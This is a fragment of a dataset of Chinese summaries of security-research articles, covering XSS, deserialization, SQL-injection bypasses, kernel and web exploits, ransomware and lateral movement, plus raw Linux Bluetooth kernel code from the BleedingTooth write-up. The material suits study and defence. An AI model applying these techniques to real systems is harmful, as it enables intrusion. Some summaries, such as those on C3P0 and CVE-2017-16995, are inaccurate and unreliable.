        "FileName": "11809-从2022中科大hackgame web中学习pdflatex RCE和python反序列化.pdf"
    },
    {
        "page_content": "该文档探讨了在 Java 中使用反射机制绕过 Runtime.getRuntime().exec() 方法进行命令执行的多种方法。它分析了 Runtime 类的底层实现，并提供了使用反射获取类对象、构造函数、成员变量和方法的代码示例。文档还介绍了如何使用 ProcessBuilder 类和反射来构造命令执行，并讨论了在 Windows 和 Linux 系统中使用反射进行命令执行的具体实现。",
        "FileName": "12446-探究使用反射进行除Runtime的命令执行方法.pdf"
    },
    {
        "page_content": "该文档详细介绍了 20 个 XSS 挑战，涵盖了各种 XSS 攻击类型，包括反射型、存储型、DOM 型和基于 HTTP 头部的 XSS。它提供了每个挑战的源代码分析、构造有效 payload 的步骤以及绕过过滤措施的技巧。",
        "FileName": "12062-xss挑战之旅.pdf"
    },
    {
        "page_content": "该文档介绍了 DVWA 靶场中的文件上传漏洞，分析了不同安全级别的漏洞利用方法，包括上传一句话木马、绕过文件类型检查、利用文件包含漏洞等，并提供了相应的代码分析和利用步骤。",
        "FileName": "12031-DVWA靶场之File Upload学习分享.pdf"
    },
    {
        "page_content": "**文档主题：** eBPF 漏洞分析\n\n**文档内容：**\n\neBPF（扩展 Berkeley 数据包过滤器）是一种内核模块，用于在 Linux 内核中安全高效地执行用户定义的代码。它最初设计用于数据包过滤，但后来扩展到其他网络和安全用例。\n\n2017 年，一个名为 CVE-2017-16995 的 eBPF 漏洞被发现。该漏洞是由内核版本小于 4.13.9 的系统中 eBPF 验证器中的一个整数扩展问题引起的。该漏洞允许攻击者通过注入恶意 eBPF 代码来提升到 root 权限。\n\n该漏洞的利用涉及以下步骤：\n\n1. 创建一个 eBPF 程序，其中包含恶意指令。\n2. 将 eBPF 程序加载到内核。\n3. 将 eBPF 程序附加到一个网络接口。\n4. 发送精心设计的网络数据包，触发恶意指令的执行。\n\n成功利用该漏洞后，攻击者可以获得 root 权限并执行任意代码。\n\n该漏洞已在内核版本 4.13.9 中得到修复。建议所有受影响的系统升级到最新版本的内核。",
        "FileName": "7782-CVE-2017-16995复现与分析.pdf"
    },
    {
        "page_content": "mDNS（多播 DNS）是一种在没有传统 DNS 服务器的网络中发现设备的协议。它通过广播查询请求来解析计算机名和服务名，并通过广播响应包来返回结果。mDNS 存在安全问题，例如信息泄露和欺骗，可以通过伪造同名服务或发送 TTL=0 的数据包来利用。",
        "FileName": "9171-对苹果mDNS协议的中间人攻击.pdf"
    },
    {
        "page_content": "**文档主题：** Rootkit 技术及其在 APT 攻击中的应用\n\n**内容：** Rootkit 是一种恶意软件，可隐藏在系统中并长期驻留，使攻击者能够窃取数据、劫持系统和规避检测。它常用于 APT 攻击，其中攻击者以窃取情报或破坏基础设施为目标。Rootkit 的发展历久弥新，呈现从简单到复杂、高层向低层的演化趋势。尽管操作系统提供商和安全研究人员不断开发检测和对抗 Rootkit 的技术，但攻击者也在开发绕过这些防御机制的方法。Rootkit 的持续发展和 APT 组织的广泛使用凸显了其作为一种危险且难以检测的威胁的重要性。",
        "FileName": "10823-【Rootkit 系列研究】序章：悬顶的达摩克利斯之剑.pdf"
    },
    {
        "page_content": "本文档介绍了提权的概念、原因和方法，包括 Windows 和 Linux 系统中的权限划分、基础命令和常见的提权技术。通过密码破解、导出系统文件和利用漏洞，可以提升权限，从而在服务器中获得更高的访问权限。",
        "FileName": "8054-提权学习之旅—基础篇.pdf"
    },
    {
        "page_content": "该文档总结了 Fastjson 远程命令执行漏洞，包括漏洞原理、影响版本、漏洞启动方法和利用链。它还提供了利用 Fastjson autoType 在处理 JSON 对象时未对 @type 字段进行完全安全性验证的漏洞，攻击者可以通过构造恶意类并调用该类的 set/get 方法来访问属性，从而实现远程代码执行。",
        "FileName": "10041-某json远程命令执行漏洞总结.pdf"
    },
    {
        "page_content": "**主题：** Active Directory PowerShell cmdlet 的使用\n\n**内容：** 文档介绍了如何在 Windows Server 2008 R2 及更高版本中使用 Active Directory PowerShell cmdlet 来收集域内信息，包括如何安装必要的模块、使用基本 cmdlet（如 Get-ADUser 和 Get-ADComputer）以及获取有关森林、域、域控制器、计算机、用户、组和密码策略的信息。",
        "FileName": "8362-Active Directory PowerShell.pdf"
    },
    {
        "page_content": "该文档分析了 PHPMailer 中的两个漏洞，CVE-2021-3603 和 CVE-2021-34551。CVE-2021-3603 允许通过调用可控函数来执行任意代码，而 CVE-2021-34551 允许通过包含 UNC 路径上的文件来执行代码。文档提供了漏洞分析、证明、修复和攻击面的详细信息，并强调了在代码审计中注意开发细节的重要性。",
        "FileName": "9766-PHP Mailer 最新代码执行漏洞.pdf"
    },
    {
        "page_content": "该文档分析了多人和运动溯源和反制思路，并提供了反制团队建设、技术层面的反制思路、针对红队常⻅⼯具的反制、以及社交账号精准溯源的蜜罐技术等内容。",
        "FileName": "10268-HW多人运动溯源及反制指北.pdf"
    },
    {
        "page_content": "Stowaway 2.0 是一款多级代理工具，专为渗透测试人员设计，用于突破内网访问限制，构建树状节点网络，并轻松实现管理功能。它具有友好的交互界面、丰富的节点信息展示、多级 socks5 流量代理转发、节点间相互认证和流量加密等特性，支持多种平台和协议。",
        "FileName": "9514-Stowaway 2.0来了～.pdf"
    },
    {
        "page_content": "该文档探讨了 PHP 中的序列化和反序列化漏洞，以及 XML 外部实体注入 (XXE) 漏洞和不安全的 URL 跳转问题。它解释了这些漏洞的原理，提供了示例代码，并强调了它们可能造成的危害，例如 XSS 攻击、任意文件读取和 URL 重定向。",
        "FileName": "12013-Pikachu靶场-合集1.pdf"
    },
    {
        "page_content": "该文档分析了 Tomcat Ghostcat 漏洞，该漏洞允许攻击者通过 AJP 协议读取任意文件并包含任意文件。漏洞的根本原因是 Tomcat 对用户输入过于信任，导致变量覆盖。修复措施包括白名单和拒绝不在列表中的属性。",
        "FileName": "7510-tomcat幽灵猫分析.pdf"
    },
    {
        "page_content": "Apache Shiro 认证绕过漏洞（CVE-2020-17523）影响 Apache Shiro < 1.7.1 版本，当与 Spring 结合使用时，攻击者可通过构造特殊的 HTTP 请求包，利用空格等空字符绕过 Shiro 身份验证，从而访问受保护的资源。该漏洞的根源在于 Shiro 的 pathMatches 函数在处理路径时，由于 trimTokens 参数默认设置为 true，导致空格等空白字符被删除，使得 Shiro 无法正确匹配路径，从而绕过身份验证。",
        "FileName": "9183-Apache Shiro 认证绕过分析（CVE-2020-17523）.pdf"
    },
    {
        "page_content": "**主题：** 通达 OA 任意文件上传漏洞利用，通过文件包含执行远程恶意代码。\n\n**内容：** 该漏洞利用了通达 OA 身份认证绕过和文件包含漏洞，攻击者可以通过上传包含恶意代码的 PHP 文件，并通过 POST 请求修改上传模式和消息类别，在目标系统上执行任意命令。",
        "FileName": "7437-通达OA任意文件上传文件包含GetShell.pdf"
    },
    {
        "page_content": "BleedingTooth: Linux 蓝⽛零点击远程代码执⾏漏洞 BleedingTooth   是  Linux  蓝⽛⼦系统⾥零点击漏洞的⼀个集合，其可以允许未经授权的远程攻击者在近距离内对存在漏洞的设备以内核权限执⾏任意代码 我注意到⽹络⼦系统已经通过   syzkaller   进⾏了⼴泛的模糊测试。但是像蓝⽛这样的⼦系统没有被很好的覆盖。总体⽽⾔，对蓝⽛主机的攻击⾯的研究似乎相当有限  ——  ⼤部分公开的蓝⽛漏洞都只影响 固件 或者其本身的规范 ，并且只允许攻击者窃听和 / 或操作信 息。 但是如果攻击者可以完全控制设备会怎么样？演示这个场景最出名的例⼦是   BlueBorne   和   BlueFrag 。我给⾃⼰定的⽬标是研究 Linux  的蓝⽛协议栈，拓展  BlueBorne  的发现，并且扩展  syzkaller  去  fuzz  \t /dev/vhci \t   设备。 这篇博⽂描述了我深⼊研究代码，发现多个⾼危漏洞以及最后在  x86-64 Ubuntu 20.04.1  的⽬标上构造⼀个成熟的  RCE  漏洞利⽤链的过程（ Video ）。 Google  直接联系了   BlueZ   和  Linux  蓝⽛⼦系统维护者（ intel ），⽽不是让  Linux  内核安全团队协调多⽅响应这⼀系列漏洞。 Intel  随安全公告   INTEL-SA-00435 发布了补丁，但是在信息披露的时候，此时补丁还没有包含在任何已发布的内核版本中。为了促 进沟通， Linux  内核安全团队应该被通知，以后这种类型的漏洞也应该报告给他们。沟通的时间表在⽂章底部。有关的漏洞补丁 分别如下： BadVibes:  基于堆的缓冲区溢出漏洞（ CVE-2020-24490 ） BadChoice:  基于栈的信息泄漏（ CVE-2020-12352 ） BadKarma:  基于堆类型的混淆（ CVE-2020-12351 ） 让我们简单的描述下蓝⽛协议栈。蓝⽛芯⽚使⽤  HCI （ Host Controller Interface ）协议与主机（操作系统）通信。常⻅的封包如 下： 指令封包  ——  由主机发送给控制器 事件封包  ——  由控制器发送给主机以通知事件 数据封包  ——  通常传输  L2CAP （ Logical Link Control and Adaptation Protocol ）封包，实现传输层。 像  A2MP （ AMP  管理协议）或  SMP （安全管理协议）这样的⾼级协议都是建⽴在  L2CAP  之上的。在  Linux  的实现中，所有这些 协议都是在没有身份认证的情况下公开的，由于这些协议都存在于内核之中因此相关的漏洞就显得⾄关重要。 我通过⼿动检查  HCI  事件封包解析器发现了第⼀个漏洞（于  Linux  内核  4.19  引⼊）。 HCI  事件封包由蓝⽛芯⽚精⼼构造并发出， 通常并不能被攻击者控制（除⾮他们也能控制蓝⽛固件）。然⽽，有两个⾮常相似的⽅法， \t hci_le_meta_evt() \t   和   \t hci_le_ext_adv_report_evt() \t ，作⽤是解析来⾃远程设备的播报。这些报告⼤⼩不⼀。 //\thttps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c static \t void \t hci_le_adv_report_evt ( struct \t hci_dev \t * hdev , \t struct \t sk_buff \t * skb ) { \t\t\t\t u8 \t num_reports \t = \t skb -> data [ 0 ]; \t\t\t\t void \t * ptr \t = \t & skb -> data [ 1 ]; \t\t\t\t hci_dev_lock ( hdev ); \t\t\t\t while \t ( num_reports -- ) \t { \t\t\t\t\t\t\t\t struct \t hci_ev_le_advertising_info \t * ev \t = \t ptr ; \t\t\t\t\t\t\t\t s8 \t rssi ; \t\t\t\t\t\t\t\t if \t ( ev -> length \t <= \t HCI_MAX_AD_LENGTH ) \t { \t\t\t\t\t\t\t\t\t\t\t\t rssi \t = \t ev -> data [ ev -> length ]; \t\t\t\t\t\t\t\t\t\t\t\t process_adv_report ( hdev , \t ev -> evt_type , \t & ev -> bdaddr , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ev -> bdaddr_type , \t NULL , \t 0 , \t rssi , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ev -> data , \t ev -> length ); \t\t\t\t\t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t\t\t\t\t bt_dev_err (\n57.rssi , \t ev -> data , \t ev -> length ); \t\t\t\t\t\t\t\t } \t else \t { \t\t\t\t\t\t\t\t\t\t\t\t bt_dev_err ( hdev , \t \"Dropping\tinvalid\tadvertising\tdata\" ); \t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t ptr \t += \t sizeof ( * ev ) \t + \t ev -> length \t + \t 1 ; \t\t\t\t } \t\t\t\t hci_dev_unlock ( hdev ); } ... static \t void \t hci_le_ext_adv_report_evt ( struct \t hci_dev \t * hdev , \t struct \t sk_buff \t * skb ) { \t\t\t\t u8 \t num_reports \t = \t skb -> data [ 0 ]; \t\t\t\t void \t * ptr \t = \t & skb -> data [ 1 ]; \t\t\t\t hci_dev_lock ( hdev ); \t\t\t\t while \t ( num_reports -- ) \t { \t\t\t\t\t\t\t\t struct \t hci_ev_le_ext_adv_report \t * ev \t = \t ptr ; \t\t\t\t\t\t\t\t u8 \t legacy_evt_type ; \t\t\t\t\t\t\t\t u16 \t evt_type ; \t\t\t\t\t\t\t\t evt_type \t = \t __le16_to_cpu ( ev -> evt_type ); \t\t\t\t\t\t\t\t legacy_evt_type \t = \t ext_evt_type_to_legacy ( hdev , \t evt_type ); \t\t\t\t\t\t\t\t if \t ( legacy_evt_type \t != \t LE_ADV_INVALID ) \t { \t\t\t\t\t\t\t\t\t\t\t\t process_adv_report ( hdev , \t legacy_evt_type , \t & ev -> bdaddr , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ev -> bdaddr_type , \t NULL , \t 0 , \t ev -> rssi , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t ev -> data , \t ev -> length ); \t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t ptr \t += \t sizeof ( * ev ) \t + \t ev -> length ; \t\t\t\t } \t\t\t\t hci_dev_unlock ( hdev ); } 注意两个⽅法是怎么调⽤   \t process_adv_report() \t   的，后者没有检查   \t ev->length \t   是否⼩于或等于 \t HCI_MAX_AD_LENGTH=31 \t 。函数   \t process_adv_report() \t   接着会传递事件数据和⻓度来调⽤ \t store_pending_adv_report() \t ： //\thttps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c static \t void \t process_adv_report ( struct \t hci_dev \t * hdev , \t u8 \t type , \t bdaddr_t \t * bdaddr , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t u8 \t bdaddr_type , \t bdaddr_t \t * direct_addr , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t u8 \t direct_addr_type , \t s8 \t rssi , \t u8 \t * data , \t u8 \t len ) { \t\t\t\t ... \t\t\t\t if \t ( ! has_pending_adv_report ( hdev )) \t { \t\t\t\t\t\t\t\t ... \t\t\t\t\t\t\t\t if \t ( type \t == \t LE_ADV_IND \t || \t type \t == \t LE_ADV_SCAN_IND ) \t { \t\t\t\t\t\t\t\t\t\t\t\t store_pending_adv_report ( hdev , \t bdaddr , \t bdaddr_type , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t rssi , \t flags , \t data , \t len ); \t\t\t\t\t\t\t\t\t\t\t\t return ; \t\t\t\t\t\t\t\t } \t\t\t\t\t\t\t\t ... \t\t\t\t } \t\t\t\t ... } 最后， \t store_pending_adv_report() \t   ⼦程序拷⻉数据到   \t d->last_adv_data \t   ： //\thttps://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c static \t void \t store_pending_adv_report ( struct \t hci_dev \t * hdev , \t bdaddr_t \t * bdaddr , \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t u8 \t bdaddr_type , \t s8 \t rssi ,",
        "FileName": "9465-BleedingTooth Linux 蓝牙零点击远程代码执行漏洞.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 intigriti-403 和 404 页面上的 XSS 漏洞。利用过程涉及构造 403 页面以绕过 HTML 实体编码，使用 iframe 的 srcdoc 属性绕过 innerHTML 限制，并利用 404 页面绕过 CSP 规则。最终，攻击者可以构造一个 payload，通过将二次 URL 编码的 payload 附加到 403 页面，在页面中注入恶意脚本。",
        "FileName": "7640-intigriti-403，404页面XSS挑战题解.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Linux 堆分配原理及源码分析，包括 tcache 技术的实现。tcache 是一种缓存机制，用于存储最近释放的 chunk，以提高内存分配效率。文档详细介绍了 fast bin、small bin、large bin 和 top chunk 等不同类型的 bin，以及它们在内存分配中的作用。此外，文档还分析了 _int_malloc 函数，该函数是 Linux 堆分配的主要内容，并解释了它如何根据请求的字节数和可用 arena 来分配 chunk。",
        "FileName": "10325-glibc(2.26) malloc原理及源码分析.pdf"
    },
    {
        "page_content": "该文档介绍了在测试过程中对登录参数加密进行逆向分析的方法，包括使用 Python 脚本和提取前端 JavaScript 代码进行逆向两种方法。通过使用 AES 的 ECB 模式加密和 Crypto-js 库，可以对密码进行加密和解密，从而帮助测试人员在登录框爆破时批量加密密码并将其作为字典进行爆破。",
        "FileName": "12423-记一次测试过程中登录参数加密逆向分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何绕过云锁注⼊，通过联合注⼊和报错注⼊两种⽅式绕过云锁的拦截，并提供了具体的绕过方法和示例，包括绕过 order by、系统函数和报错函数等。",
        "FileName": "7641-bypass云锁注入第二集.pdf"
    },
    {
        "page_content": "本文重点介绍了利用 PostgreSQL 数据库管理系统中 SQL 注入漏洞进行渗透测试的方法，包括绕过 Web 应用程序防火墙、泄露不同查询子句（如 SELECT、WHERE、ORDER BY、FROM）中的数据，以及利用嵌套查询、连接运算符和时间盲注技术。",
        "FileName": "8621-SQL注入渗透PostgreSQL(bypass tricks).pdf"
    },
    {
        "page_content": "该文档分析了两个 NodeJS 题目，第一个题目涉及常规信息泄露和 JWT 令牌库的漏洞利用，第二个题目涉及沙盒逃逸。文档详细介绍了这两个题目的考点、分析过程和解题思路，并提供了代码示例和参考链接。",
        "FileName": "7714-虎符杯两道NodeJS题目的分析.pdf"
    },
    {
        "page_content": "MySQL JDBC 反序列化漏洞利用了 Java 对象序列化和反序列化的特性，攻击者可以通过构造恶意对象，在 JDBC 连接过程中触发反序列化操作，从而执行任意代码。该漏洞影响 MySQL JDBC 8.0.12 及更早版本，可以通过设置 JDBC 连接属性 autoDeserialize 为 true 来利用。",
        "FileName": "8159-小白看得懂的MySQL JDBC 反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档讨论了不安全的文档上传漏洞，重点关注客户端检查和 MIME 类型修改。它解释了如何绕过前端限制，修改文件类型，并利用文件包含漏洞来执行恶意代码。文档还强调了在设计文件上传功能时进行严格安全考虑的重要性。",
        "FileName": "12007-Pikachu靶场-Unsafe Fileupload.pdf"
    },
    {
        "page_content": "该文档记录了一次爆破登录过程，作者通过爆破用户名和密码，最终成功进入后台并挖到注⼊。作者使用了多种爆破字典，包括常用弱⼝令、根据⼚商域名⽣成的字典、以及⾃⼰制作的姓全拼加简拼的字典。",
        "FileName": "7732-一次稍显曲折的爆破经历.pdf"
    },
    {
        "page_content": "该文档介绍了 wJa 工具，它允许用户对 Java JAR 包进行源码级调试，包括设置断点、查看变量和单步执行代码。该工具通过反编译 JAR 包并使用 JDI 实现，提供了一个类似于 IDE 的调试环境，方便用户进行代码审计和故障排除。",
        "FileName": "10748-wJa无源码的源码级调试jar包.pdf"
    },
    {
        "page_content": "该文档是一篇关于某 CMS 系统的审计报告，详细介绍了该系统中存在的五个安全漏洞，包括任意管理员添加、任意文件写入、任意文件删除、SQL 注入和任意文件上传。这些漏洞允许攻击者在未经授权的情况下添加管理员、写入和删除文件、执行 SQL 查询以及上传任意文件，从而对系统造成严重损害。",
        "FileName": "10987-某Cms审计小结.pdf"
    },
    {
        "page_content": "C3P0是一个用于创建和管理连接的Java安全库，它利用“池”的方式复用连接以减少资源开销。文档分析了C3P0的原生反序列化利用链，该利用链涉及JNDI注入和反射操作。攻击者可以通过构造恶意Reference对象，在反序列化过程中加载和实例化任意类，从而实现远程代码执行。",
        "FileName": "10728-Java安全-C3P0.pdf"
    },
    {
        "page_content": "该文档介绍了如何手动编写 shellcode 来实现特定功能，包括绕过沙箱限制和构造系统调用。它提供了示例代码和逐步说明，展示了如何设置寄存器、构造 read 和 write 调用，以及最终跳转到系统调用地址以执行 shellcode。",
        "FileName": "12828-how2手写shellcode.pdf"
    },
    {
        "page_content": "该文档详细记录了对 Vulnstack 内网靶场的渗透过程，包括利用 Laravel 远程代码执行漏洞获取初始访问权限、通过 Redis 未授权访问和 SSH 公钥写入获得提权、使用 docker 逃逸和 Linux 内核提权漏洞进一步提升权限，以及通过 MS17010 漏洞和 CVE-2020-1472 漏洞最终拿下域控。",
        "FileName": "9574-Vulnstack内网靶场渗透记录.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Xposed 框架和 XServer 模块在不脱壳的情况下抓取加密包。Xposed 框架是一个可以修改系统而不修改 APK 的框架服务，而 XServer 模块是一个用于分析方法的 Xposed 插件，它可以记录和拦截方法的调用，并通过 HTTP 和 WebSocket 提供远程动态操作界面。通过使用 Xposed+XServer，可以查找和定位加密函数，并对其进行 hook，从而在不脱壳的情况下对加密包进行解密和修改。",
        "FileName": "7669-Xposed+XServer无需脱壳抓取加密包.pdf"
    },
    {
        "page_content": "该文档记录了一次反诈骗渗透测试，作者通过收集信息、利用漏洞和绕过安全措施，成功获取了诈骗网站的低权限 shell，并发现了杀猪盘工具和数据库信息。作者将收集到的信息提交给了朋友和警方，但后续处理情况未知。",
        "FileName": "9200-一次不太成功的反诈骗渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了利用 house of blindless 技术在不泄露 libc 地址的情况下通过偏移实现 libc 区域的任意写，从而控制程序流。",
        "FileName": "12851-house of blindless学习利用.pdf"
    },
    {
        "page_content": "该文档描述了一次逻辑漏洞挖掘过程，通过修改目标网站的 URL，攻击者可以访问其他用户的身份信息，从而修改密码并登录。该漏洞挖掘过程涉及登录、修改个人信息和修改密码等步骤，最终成功实现了平行的越权访问。",
        "FileName": "8229-记一次逻辑漏洞挖掘.pdf"
    },
    {
        "page_content": "Java 代码审计入门系列文章的第四篇，主要介绍了服务端请求伪造（SSRF）漏洞的原理和实际案例，包括利用 HTTP/HTTPS 协议进行端口探测和任意文件下载/读取的示例，并提供了修复方案和实际案例分析，帮助初学者理解 Java 代码审计中的 SSRF 漏洞。",
        "FileName": "7186-【Java 代码审计入门-04】SSRF 漏洞原理与实际案例介绍.pdf"
    },
    {
        "page_content": "HSQLDB（HyperSQL DataBase）是一个小型嵌入式数据库，它允许通过 HTTP 和 HSQL 协议连接服务器，并支持内存、文件、WEB 服务器和 HSQL 服务器四种连接模式。本文重点介绍了 HSQLDB 的安全测试方法，包括调试、JDBC URL、反序列化、高危 SQL 命令、SQL 注入、延时盲注和堆叠注入等方面，并提供了具体的示例和利用场景。",
        "FileName": "9162-HSQLDB 安全测试指南.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 FastJSON 反序列化漏洞在 SpringBoot 和 Tomcat 应用程序中植入内存 Webshell，实现权限维持和回显。它提供了详细的步骤，包括获取上下文环境、动态注册控制器、创建内存 Webshell 和通过 Filter 注册 Webshell。此外，还讨论了在使用过程中遇到的问题和解决方案，并提供了工具链接。",
        "FileName": "9741-炒冷饭系列之第一篇--某sonJndi回显利用+GUI工具.pdf"
    },
    {
        "page_content": "该文档主要讨论了域内相关协议和横向移动方法，包括 NTLM、Kerberos、Digest、Wdigest Auth、PTH、RDP 哈希传递、IPC$、PsExec 和黄金票据。它提供了这些协议和技术的详细概述，包括它们的优点、缺点、使用条件和防御措施。",
        "FileName": "10491-域内相关协议与横向方法总结（一）.pdf"
    },
    {
        "page_content": "本文介绍了如何解决一些 BAT 网站的 XSS 漏洞，重点介绍了第 14 和 13 题的解题思路。第 14 题利用了 opener 和 location 的特性，通过打时间差的方式绕过跨域限制；第 13 题则利用了 CSP 规则，通过在服务器端部署 CSP 规则来限制恶意代码的执行。",
        "FileName": "11795-一些BAT的XSS实例（七）技巧篇.pdf"
    },
    {
        "page_content": "本文讨论了在目标防火墙限制出网端口的情况下，快速探测目标防火墙出网端口的工具化实现。该工具支持同时开启多个端口，并打印出产生回连的端口号，从而帮助攻击者判断哪些端口可以出网，提高攻击效率。",
        "FileName": "10677-快速探测目标防火墙出网端口的工具化实现.pdf"
    },
    {
        "page_content": "该文档介绍了一种绕过常规 SQL 注入方法的独特技术，利用字符串拼接在无法使用 AND 和 OR 运算符的情况下实现注入。通过将字符 ASCII 码值与 CHR 函数相结合，攻击者可以构造一个 payload，将数据库执行的语句拼接成所需的查询，从而读取数据。",
        "FileName": "8396-一次字符串拼接的sql注入实战.pdf"
    },
    {
        "page_content": "CVE-2020-25695 漏洞利用了 PostgreSQL 中安全受限操作退出前未完全清除/重置状态的问题，允许未经授权的用户通过触发索引函数来提升权限，最终以特权用户身份执行命令。该漏洞影响所有受支持的 PostgreSQL 版本，可以通过禁用自动清理或避免手动运行某些操作来缓解，但可能会严重影响性能。",
        "FileName": "8682-CVE-2020-25695 Postgresql中的权限提升.pdf"
    },
    {
        "page_content": "该文档介绍了 ExchangePE 工具，该工具用于在内网中快速查找 Exchange 服务器，从而获得域控权限。它通过遍历子域名、解析 DNS 记录和比较 X-Owa-Version 来识别 Exchange 服务器，并显示其版本号。该工具旨在提高匹配准确性并利用 Go 语言的高并发性。",
        "FileName": "12255-ExchangePE（环境中快速寻找Exchange服务器）.pdf"
    },
    {
        "page_content": "pickle 是 Python 下的序列化与反序列化包，它可以将内存中的数据长期储存。pickle 实际上可以看作是一种独立的语言，通过对 opcode 的更改编写可以执行 python 代码、覆盖变量等操作。pickle 解析依靠 Pickle Virtual Machine (PVM) 进行。PVM 涉及到三个部分：解析引擎、栈、内存。解析引擎从流中读取 opcode 和参数，并对其进行解释处理。栈由 Python 的 list 实现，被用来临时存储数据、参数以及对象。memo 由 Python 的 dict 实现，为 PVM 的生命周期提供存储。",
        "FileName": "7436-pickle反序列化初探.pdf"
    },
    {
        "page_content": "BlackCat 勒索病毒采用三重勒索模式，加密数据、感染网络和系统，窃取敏感数据，并威胁在数据泄露网站上公布被盗数据。它还使用定制化参数选项，绕过 UAC，关闭进程和服务，删除系统备份，并通过横向移动传播到其他设备。",
        "FileName": "11656-“黑猫”又伸出恶魔之手？揭秘BlackCat病毒的三重勒索.pdf"
    },
    {
        "page_content": "本文探讨了不包含数字和字母的 Webshell 的三种构造方法，包括通过异或操作、位运算和 PHP 自增技巧。这些方法允许攻击者绕过常见的过滤机制，并在目标系统上执行任意代码。本文还提供了利用这些方法解决 CTFshow shellme_Revenge 挑战的示例。",
        "FileName": "10085-由一题了解深入不包含数字和字母的webshall.pdf"
    },
    {
        "page_content": "本文探讨了从前端信息泄露中进行漏洞挖掘的方法，重点关注了Webpack目录中API接口的发现。通过分析前端代码，作者发现了敏感数据和接口，并利用这些信息成功进行了漏洞挖掘，获得了200元的赏金。文章强调了前端信息在渗透测试中的重要性，并鼓励读者仔细检查前端代码以发现潜在的漏洞。",
        "FileName": "10005-从前端信息泄露进行漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档分析了 Real World CTF 2022 高校赛 Digging into kernel 题目，该题目涉及内核漏洞利用，通过分析启动脚本发现 monitor 未设置为 null，可直接进入 qemu monitor 模式获取 flag。修复启动脚本后，题目本质是利用 UAF 修改子进程的 cred 完成提权，可通过劫持 n_tty_ops 控制 RIP，利用 pt_regs 完成栈迁移，最终使用 swapgs_restore_regs_and_return_to_usermode 恢复栈并返回用户态，实现稳定化提权。",
        "FileName": "11053-对 Real World CTF 2022 高校赛 Digging into kernel 的重新思考.pdf"
    },
    {
        "page_content": "本文档详细介绍了对 Tapo TC60 摄像头的分析，包括拆解、固件提取、UART shell 访问和配置数据解密。通过物理访问和 UART 控制台，研究人员能够转储固件、添加后门帐户并解密配置数据，从而访问视频流。",
        "FileName": "12801-hacking Tapo TC60摄像头.pdf"
    },
    {
        "page_content": "**主题：**某 CMS 代码审计\n\n**内容：**该文档详细介绍了对某 CMS 代码进行审计的过程，包括发现 SQL 注入漏洞、任意文件读取漏洞和反射型 XSS 漏洞。文档还提供了利用这些漏洞的 POC 代码，并讨论了绕过限制的方法。",
        "FileName": "10597-某cms代码审计.pdf"
    },
    {
        "page_content": "该文档分析了 Tale 博客系统的代码审计过程，重点关注了三个安全漏洞：任意文件读取、任意代码文件写入和任意文件上传。这些漏洞允许攻击者读取敏感文件、写入恶意代码并上传任意文件，从而获得对系统的未授权访问。",
        "FileName": "12489-Tale博客系统代码审计过程.pdf"
    },
    {
        "page_content": "该文档分析了 phpMyAdmin 4.8.x 版本中存在的本地文件包含漏洞（CVE-2018-12613），该漏洞允许攻击者在后台任意包含文件，从而拿下搭建了该服务的站点。文档详细介绍了漏洞复现步骤，包括利用数据库创建 shell、利用本地文件包含包含文件、利用 session 文件创建 shell 等方法，并分析了漏洞的成因和修复建议。",
        "FileName": "12184-CVE-2018-12613 本地文件包含漏洞复现+漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 .NET 中 LosFormatter 类的反序列化漏洞，该漏洞可导致远程代码执行 (RCE)。它详细介绍了 LosFormatter 的工作原理，并展示了如何利用它来反序列化恶意对象，从而触发 RCE。文档还讨论了其他受影响的类，例如 ClaimsIdentity、WindowsIdentity、WindowsClaimsIdentity 和 SessionSecurityToken，并提供了利用这些类的示例代码。",
        "FileName": "9597-.net反序列化之LosFormatter.pdf"
    },
    {
        "page_content": "该文档分析了 Ysoserial 框架中 CommonsCollections2 组件的利用过程，该组件利用 Java 反序列化漏洞，通过创建恶意 Payload 来执行任意命令。文档详细介绍了 Payload 的生成过程，涉及 Javassist 类库、PriorityQueue 类和 InvokerTransformer 类等关键组件。",
        "FileName": "8010-ysoserial-payloads-CommonsCollections2调试分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Protobuf 的概念、使用方法以及在逆向工程中的应用。Protobuf 是一种高效的数据压缩编码方式，可用于通信协议、数据存储等。它由一种用于声明数据结构的语言组成，然后根据目标实现将其编译为代码或另一种结构。文档还提供了 Protobuf 的安装、使用和逆向工程的详细步骤，并附有示例代码。",
        "FileName": "12580-Protobuf Pwn学习利用.pdf"
    },
    {
        "page_content": "这篇文档记录了一次失败的实战渗透测试，目标网站为 xxx.com。渗透者通过信息收集和脆弱点攻击，尝试获取网站的访问权限，但由于安全策略和缺乏可利用的漏洞，最终未能成功渗透。",
        "FileName": "7821-记一次失败的实战渗透.pdf"
    },
    {
        "page_content": "本文探讨了进程强杀技术，重点介绍了未文档化的内核 API PspTerminateProcess，该 API 可用于终止其他进程。通过提取特征码并进行暴力搜索，可以找到该函数的地址，并使用函数指针执行它。该技术可用于对抗反病毒软件，并演示了如何使用它来终止受保护的进程。",
        "FileName": "10663-浅谈进程强杀.pdf"
    },
    {
